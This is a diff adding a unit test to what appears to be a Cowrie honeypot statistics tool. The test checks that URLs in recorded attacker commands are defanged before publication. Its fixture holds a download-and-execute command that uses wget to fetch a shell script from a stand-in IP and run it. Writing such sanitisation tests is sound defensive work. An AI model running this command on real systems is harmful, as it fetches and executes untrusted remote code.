@@ -389,6 +389,16 @@ class ProfilesTest(unittest.TestCase):
         self.assertNotIn("192.0.2.0", out["ips"])                # last seen 40 days ago
         self.assertIn("top_commands", p)
 
+    def test_urls_in_published_commands_are_defanged(self):
+        cmd = "cd /tmp; wget http://203.0.113.5/x.sh; sh x.sh"
+        day = summarize([event("cowrie.session.connect", ts="2026-10-12T10:00:00Z"),
+                         event("cowrie.login.success", username="root", password="x", ts="2026-10-12T10:00:01Z"),
+                         event("cowrie.command.input", input=cmd, ts="2026-10-12T10:00:02Z")], "2026-10-12")
+        published = json.dumps([stats.build([day], FakeGeo(), now=StatsV2Test.NOW),
+                                stats.build_profiles([day], FakeGeo(), now=StatsV2Test.NOW)])
+        self.assertNotIn("http://", published)
+        self.assertIn("hxxp://203[.]0[.]113[.]5/x.sh", published)
+
 
 class ReplaySelectionTest(unittest.TestCase):
     def test_select_sync_prune(self):
